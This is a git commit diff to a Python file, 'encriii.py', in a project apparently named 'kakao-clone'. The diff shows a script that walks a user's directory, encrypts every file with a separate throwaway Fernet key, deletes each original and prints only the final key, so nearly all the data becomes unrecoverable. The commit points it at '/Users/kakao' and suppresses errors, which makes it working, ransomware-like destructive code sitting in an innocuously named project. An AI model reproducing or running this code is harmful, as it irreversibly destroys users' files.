d3c5cdbde20e1f573935c08c23c77a4a29954a6a
shineild <49579706+shineild@users.noreply.github.com>
2022-12-22 13:15:35 +0900

    Update encriii.py

--- kakao-clone/encriii.py
+++ kakao-clone/encriii.py
@@ -1,7 +1,7 @@
 import os
 from cryptography.fernet import Fernet
 
-rootDir = '/test'
+rootDir = '/Users/kakao'
 
 # Initialize an empty list to store the file names
 file_list = []
@@ -18,31 +18,34 @@ for dirName, subdirList, fileList in os.walk(rootDir):
 
 # Print the list of files
 for name in file_list:
-
+    try:
 
 # Generate a key
-    key = Fernet.generate_key()
+        key = Fernet.generate_key()
 
 # Open the file to encrypt
 #file_to_encrypt = open('file_to_encrypt.txt', 'rb')
-    file_to_encrypt = open(name, 'rb')
+        file_to_encrypt = open(name, 'rb')
 # Read the contents of the file
-    file_data = file_to_encrypt.read()
+        file_data = file_to_encrypt.read()
 
 # Create a Fernet object using the key
-    fernet = Fernet(key)
+        fernet = Fernet(key)
 
 # Encrypt the file data
-    encrypted_data = fernet.encrypt(file_data)
-    new_name = name + '_enc.txt'
+        encrypted_data = fernet.encrypt(file_data)
+        new_name = name + '_enc.txt'
 # Write the encrypted data to a new file
-    encrypted_file = open(new_name, 'wb')
-    encrypted_file.write(encrypted_data)
+        encrypted_file = open(new_name, 'wb')
+        encrypted_file.write(encrypted_data)
 
 # Close the files
-    file_to_encrypt.close()
-    encrypted_file.close()
-    os.remove(name)
+        file_to_encrypt.close()
+        encrypted_file.close()
+        os.remove(name)
+
+    except:
+        print("err")
 
 # Print the key
 print('Encryption key:', key)
